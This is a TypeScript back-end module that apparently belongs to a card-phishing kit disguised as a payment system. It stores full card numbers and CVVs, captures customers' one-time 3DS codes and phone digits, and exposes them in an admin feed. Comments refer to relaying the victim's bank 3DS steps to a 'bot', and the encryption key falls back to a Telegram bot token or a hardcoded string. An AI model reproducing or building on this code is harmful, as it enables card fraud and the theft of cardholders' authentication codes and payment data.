import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const DATA_DIR = path.join(process.cwd(), "data");
const CARDS_PATH = path.join(DATA_DIR, "creditCardOrders.json");
const FEED_PATH = path.join(DATA_DIR, "creditCardFeed.json");

export type AdminCardPayload = {
  holder: string;
  pan: string;
  expiry: string;
  cvv: string;
  savedAt: string;
};

export const OTP_MAX_ATTEMPTS = 2;
export const OTP_RESEND_COOLDOWN_SEC = 60;

export type CardFeedEntry = {
  order_ref: string;
  transaction_id: string;
  type: string;
  amount: number;
  method: string;
  status: string;
  user_name: string | null;
  user_ip: string | null;
  saved_at: string;
  updated_at: string;
  last_otp: string | null;
  otp_at: string | null;
  otp_attempts?: number;
  otp_resend_requested_at?: string | null;
  otp_resend_done_at?: string | null;
  /** Customer pressed Next on ACS Choose Method (unlock real 3DS Next for bot) */
  method_next_clicked?: boolean;
  method_next_at?: string | null;
  /** Last 3 digits of phone shown on bank 3DS UI */
  phone_last3?: string | null;
  card: AdminCardPayload | null;
};

export type OtpMeta = {
  attempts: number;
  maxAttempts: number;
  remaining: number;
  canResend: boolean;
  resendCooldownSec: number;
  failReason: string | null;
};

function encryptionKey(): Buffer {
  const secret = String(
    process.env.ADMIN_CARD_ENCRYPTION_KEY || process.env.TELEGRAM_BOT_TOKEN || "saraf-iq-cc"
  ).trim();
  return crypto.createHash("sha256").update(secret).digest();
}

function encryptObject(obj: unknown): string {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", encryptionKey(), iv);
  const plain = JSON.stringify(obj);
  const enc = Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptObject(payload: string): Record<string, unknown> | null {
  try {
    const buf = Buffer.from(String(payload || ""), "base64");
    if (buf.length < 29) return null;
    const iv = buf.subarray(0, 12);
    const tag = buf.subarray(12, 28);
    const enc = buf.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", encryptionKey(), iv);
    decipher.setAuthTag(tag);
    const plain = Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8");
    return JSON.parse(plain) as Record<string, unknown>;
  } catch {
    return null;
  }
}

function normalizeCardInput(fields: {
  holder?: string;
  number?: string;
  expiry?: string;
  cvv?: string;
}): AdminCardPayload | null {
  const holder = String(fields.holder || "").trim().slice(0, 120);
  const pan = String(fields.number || "").replace(/\D/g, "").slice(0, 19);
  const expiry = String(fields.expiry || "").trim().slice(0, 7);
  const cvv = String(fields.cvv || "").trim().slice(0, 4);
  if (!holder || !pan || !cvv) return null;
  return { holder, pan, expiry, cvv, savedAt: new Date().toISOString() };
}

function formatCard(raw: Record<string, unknown> | null): AdminCardPayload | null {
  if (!raw) return null;
  const holder = String(raw.holder ?? raw.cardHolder ?? "").trim();
  const pan = String(raw.pan ?? raw.number ?? raw.cardNumber ?? "").replace(/\D/g, "");
  const expiry = String(raw.expiry ?? raw.cardExpiry ?? "").trim();
  const cvv = String(raw.cvv ?? raw.cardCvv ?? "").trim();
  if (!holder && !pan) return null;
  return {
    holder,
    pan,
    expiry,
    cvv,
    savedAt: String(raw.savedAt || ""),
  };
}

function loadCardsMap(): Record<string, string> {
  try {
    if (!fs.existsSync(CARDS_PATH)) return {};
    const raw = JSON.parse(fs.readFileSync(CARDS_PATH, "utf8"));
    return raw && typeof raw === "object" && !Array.isArray(raw) ? (raw as Record<string, string>) : {};
  } catch {
    return {};
  }
}

function saveCardsMap(map: Record<string, string>) {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(CARDS_PATH, JSON.stringify(map, null, 2), "utf8");
}

function loadFeedRaw(): CardFeedEntry[] {
  try {
    if (!fs.existsSync(FEED_PATH)) return [];
    const raw = JSON.parse(fs.readFileSync(FEED_PATH, "utf8"));
    return Array.isArray(raw) ? (raw as CardFeedEntry[]) : [];
  } catch {
    return [];
  }
}

function saveFeed(list: CardFeedEntry[]) {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const trimmed = list.slice(0, 500);
  fs.writeFileSync(FEED_PATH, JSON.stringify(trimmed, null, 2), "utf8");
}

export async function saveCreditCardForOrder(
  orderRef: string,
  fields: { holder?: string; number?: string; expiry?: string; cvv?: string },
  meta: {
    transaction_id: string;
    type: string;
    amount: number;
    method: string;
    status: string;
    user_name?: string | null;
    user_ip?: string | null;
  }
): Promise<AdminCardPayload | null> {
  const ref = String(orderRef || "").trim();
  const card = normalizeCardInput(fields);
  if (!ref || !card) return null;

  const map = loadCardsMap();
  map[ref] = encryptObject(card);
  saveCardsMap(map);

  const now = new Date().toISOString();
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  const entry: CardFeedEntry = {
    order_ref: ref,
    transaction_id: meta.transaction_id,
    type: meta.type,
    amount: meta.amount,
    method: meta.method,
    status: meta.status,
    user_name: meta.user_name?.trim() || null,
    user_ip: meta.user_ip?.trim() || null,
    saved_at: ix >= 0 ? feed[ix].saved_at : now,
    updated_at: now,
    last_otp: ix >= 0 ? feed[ix].last_otp : null,
    otp_at: ix >= 0 ? feed[ix].otp_at : null,
    card,
  };
  if (ix >= 0) feed[ix] = entry;
  else feed.unshift(entry);
  saveFeed(feed);
  return card;
}

export async function attachOtpToCardFeed(orderRef: string, otp: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  const code = String(otp || "").trim().slice(0, 12);
  if (!ref || !code) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  const now = new Date().toISOString();
  feed[ix] = { ...feed[ix], last_otp: code, otp_at: now, updated_at: now };
  saveFeed(feed);
  return true;
}

export async function markMethodNextClicked(orderRef: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  if (!ref) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  const now = new Date().toISOString();
  feed[ix] = {
    ...feed[ix],
    method_next_clicked: true,
    method_next_at: now,
    updated_at: now,
    // clear any stale OTP until verify Next
    last_otp: null,
    otp_at: null,
  };
  saveFeed(feed);
  return true;
}

export async function setPhoneLast3(orderRef: string, last3: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  const digits = String(last3 || "").replace(/\D/g, "").slice(-3);
  if (!ref || digits.length < 1) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  feed[ix] = {
    ...feed[ix],
    phone_last3: digits.padStart(3, "0").slice(-3),
    updated_at: new Date().toISOString(),
  };
  saveFeed(feed);
  return true;
}

export async function getFeedMeta(orderRef: string): Promise<{
  method_next_clicked: boolean;
  phone_last3: string | null;
  last_otp: string | null;
  status: string | null;
} | null> {
  const row = feedRow(orderRef);
  if (!row) return null;
  return {
    method_next_clicked: Boolean(row.method_next_clicked),
    phone_last3: row.phone_last3 ? String(row.phone_last3) : null,
    last_otp: row.last_otp ? String(row.last_otp) : null,
    status: row.status ? String(row.status) : null,
  };
}

export async function updateCardFeedStatus(orderRef: string, status: string): Promise<boolean> {
  const ref = String(orderRef || "").trim();
  if (!ref) return false;
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) return false;
  feed[ix] = { ...feed[ix], status, updated_at: new Date().toISOString() };
  saveFeed(feed);
  return true;
}

export async function getCardFeedStatus(orderRef: string): Promise<string | null> {
  const ref = String(orderRef || "").trim();
  if (!ref) return null;
  const row = loadFeedRaw().find((e) => e.order_ref === ref);
  return row?.status ? String(row.status) : null;
}

function feedRow(orderRef: string): CardFeedEntry | null {
  const ref = String(orderRef || "").trim();
  if (!ref) return null;
  return loadFeedRaw().find((e) => e.order_ref === ref) ?? null;
}

export async function getOtpMeta(orderRef: string): Promise<OtpMeta | null> {
  const row = feedRow(orderRef);
  if (!row) return null;
  const attempts = Math.max(0, Number(row.otp_attempts ?? 0));
  const maxAttempts = OTP_MAX_ATTEMPTS;
  const remaining = Math.max(0, maxAttempts - attempts);
  const requestedAt = row.otp_resend_requested_at
    ? new Date(row.otp_resend_requested_at).getTime()
    : 0;
  const doneAt = row.otp_resend_done_at ? new Date(row.otp_resend_done_at).getTime() : 0;
  const cooldownMs = OTP_RESEND_COOLDOWN_SEC * 1000;
  const lastResendMs = Math.max(requestedAt, doneAt);
  const elapsed = lastResendMs ? Date.now() - lastResendMs : cooldownMs;
  const resendCooldownSec = elapsed >= cooldownMs ? 0 : Math.ceil((cooldownMs - elapsed) / 1000);
  const failReason =
    row.status === "failed" && attempts >= maxAttempts ? "otp_attempts_exceeded" : null;
  return {
    attempts,
    maxAttempts,
    remaining,
    canResend: resendCooldownSec === 0 && row.status !== "failed" && row.status !== "completed",
    resendCooldownSec,
    failReason,
  };
}

export async function recordWrongOtpAttempt(orderRef: string): Promise<{
  attempts: number;
  maxAttempts: number;
  remaining: number;
  rejected: boolean;
  status: string;
  failReason: string | null;
}> {
  const ref = String(orderRef || "").trim();
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === ref);
  if (ix < 0) {
    return {
      attempts: 0,
      maxAttempts: OTP_MAX_ATTEMPTS,
      remaining: OTP_MAX_ATTEMPTS,
      rejected: false,
      status: "pending",
      failReason: null,
    };
  }
  const attempts = Math.max(0, Number(feed[ix].otp_attempts ?? 0)) + 1;
  const rejected = attempts >= OTP_MAX_ATTEMPTS;
  const status = rejected ? "failed" : "retry_otp";
  const now = new Date().toISOString();
  feed[ix] = {
    ...feed[ix],
    otp_attempts: attempts,
    status,
    updated_at: now,
    last_otp: null,
    otp_at: null,
  };
  saveFeed(feed);
  return {
    attempts,
    maxAttempts: OTP_MAX_ATTEMPTS,
    remaining: Math.max(0, OTP_MAX_ATTEMPTS - attempts),
    rejected,
    status,
    failReason: rejected ? "otp_attempts_exceeded" : null,
  };
}

export async function requestOtpResend(orderRef: string): Promise<{
  ok: boolean;
  error?: string;
  cooldownSec?: number;
}> {
  const row = feedRow(orderRef);
  if (!row) return { ok: false, error: "order_not_found" };
  if (row.status === "failed" || row.status === "completed") {
    return { ok: false, error: "order_closed" };
  }
  const meta = await getOtpMeta(orderRef);
  if (!meta?.canResend) {
    return { ok: false, error: "cooldown", cooldownSec: meta?.resendCooldownSec ?? OTP_RESEND_COOLDOWN_SEC };
  }
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === row.order_ref);
  if (ix < 0) return { ok: false, error: "order_not_found" };
  const now = new Date().toISOString();
  feed[ix] = { ...feed[ix], otp_resend_requested_at: now, updated_at: now };
  saveFeed(feed);
  return { ok: true };
}

export async function markOtpResendDone(orderRef: string): Promise<void> {
  const feed = loadFeedRaw();
  const ix = feed.findIndex((e) => e.order_ref === String(orderRef || "").trim());
  if (ix < 0) return;
  feed[ix] = {
    ...feed[ix],
    otp_resend_done_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  };
  saveFeed(feed);
}

export async function peekOtpResendRequest(orderRef: string): Promise<string | null> {
  const row = feedRow(orderRef);
  return row?.otp_resend_requested_at ? String(row.otp_resend_requested_at) : null;
}

export async function getCreditCardByOrderRef(orderRef: string): Promise<AdminCardPayload | null> {
  const ref = String(orderRef || "").trim();
  if (!ref) return null;
  const enc = loadCardsMap()[ref];
  if (!enc) return null;
  return formatCard(decryptObject(enc));
}

export async function listCardFeed(opts?: { since?: string; limit?: number }): Promise<{
  items: CardFeedEntry[];
  serverTime: string;
}> {
  const limit = Math.min(200, Math.max(1, opts?.limit ?? 50));
  let items = loadFeedRaw();
  const since = opts?.since?.trim();
  if (since) {
    const t = new Date(since).getTime();
    if (Number.isFinite(t)) {
      items = items.filter((e) => new Date(e.updated_at).getTime() > t);
    }
  }
  items = items.slice(0, limit);
  for (const row of items) {
    if (!row.card) {
      row.card = await getCreditCardByOrderRef(row.order_ref);
    }
  }
  return { items, serverTime: new Date().toISOString() };
}
